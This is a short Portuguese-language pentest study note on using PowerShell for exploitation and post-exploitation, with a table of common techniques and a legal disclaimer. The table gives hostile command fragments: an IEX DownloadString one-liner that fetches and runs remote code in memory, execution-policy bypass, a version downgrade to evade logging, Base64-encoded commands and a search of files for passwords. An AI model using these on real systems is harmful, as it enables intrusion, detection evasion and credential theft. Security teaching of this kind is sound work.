## Exploração e Pós-Exploração com PowerShell

### Conceitos gerais

O PowerShell é extremamente valioso nas fases de exploração e pós-exploração
de um pentest pelos seguintes motivos:

- **Execução em memória:** scripts podem ser baixados e executados sem tocar o disco.
- **Reconhecimento do sistema:** cmdlets como `Get-Process`, `Get-Service`,
  `Get-WmiObject` fornecem informações detalhadas sobre o alvo.
- **Escalação de privilégios:** é possível identificar serviços vulneráveis, permissões
  mal configuradas e caminhos de DLL hijacking.
- **Movimentação lateral:** frameworks como PowerSploit oferecem cmdlets prontos
  para essa finalidade.
- **Evasão de antivírus:** técnicas de ofuscação e execução em memória dificultam
  a detecção.

### Técnicas comuns (resumo)

| Técnica | Descrição |
|---------|-----------|
| Download e execução em memória | Usar `IEX (New-Object Net.WebClient).DownloadString(url)` |
| Bypass de Execution Policy | `-ExecutionPolicy Bypass` ao invocar o PowerShell |
| Downgrade de versão | `-Version 2` para evitar logging avançado |
| Janela oculta | `-WindowStyle Hidden` para execução discreta |
| Comando codificado | `-EncodedCommand` para ofuscar o comando em Base64 |
| Enumeração de serviços | `Get-WmiObject -class win32_service` para buscar alvos de escalação |
| Busca de credenciais | `Select-String` para procurar senhas em arquivos |

---

## Referências e Leitura Complementar

- PowerShell no GitHub: https://github.com/powershell/powershell
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit
- Documentação oficial de Cmdlets: https://docs.microsoft.com/en-us/powershell/
- Living off the Land: https://www.secureworks.com/blog/living-off-the-land
- .NET Framework: https://en.wikipedia.org/wiki/.NET_Framework
- WMI: https://en.wikipedia.org/wiki/Windows_Management_Instrumentation
- COM: https://en.wikipedia.org/wiki/Component_Object_Model

---

> **Aviso legal:** Este material é destinado exclusivamente para fins educacionais
> e para uso em ambientes autorizados de teste de penetração. O uso indevido
> das técnicas aqui descritas pode ser ilegal. Sempre obtenha autorização antes
> de realizar qualquer teste de segurança.
